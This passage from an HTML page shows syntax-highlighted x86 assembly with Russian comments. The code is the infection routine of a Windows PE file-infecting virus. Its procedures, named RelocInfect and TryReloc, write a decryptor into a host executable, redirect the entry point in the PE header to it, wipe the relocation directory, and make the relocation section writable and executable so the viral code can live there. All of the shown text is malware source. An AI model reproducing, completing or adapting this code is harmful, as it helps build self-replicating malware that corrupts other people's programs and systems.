    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Пишим расшифровщик</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Новый EiP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">peh</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; PE заголовок</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">CloseIt</span><span class="sc0">
</span><span class="sc5">RelocInfect</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">TryReloc</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CannotReloc</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">34h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">400000h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CannotReloc</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">078h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Exports ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CannotReloc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A0h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A4h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A0h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A4h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">78h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">Chckit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">OOOOPS</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">CloseIt3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">CloseIt3</span><span class="sc0">
</span><span class="sc5">OOOOPS</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Chckit</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rinf</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CannotReloc</span><span class="sc0">
</span><span class="sc5">CloseIt3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A4h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc2">0A0h</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CannotReloc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TryReloc</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">rinf</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rsec</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span></div></body>
</html>
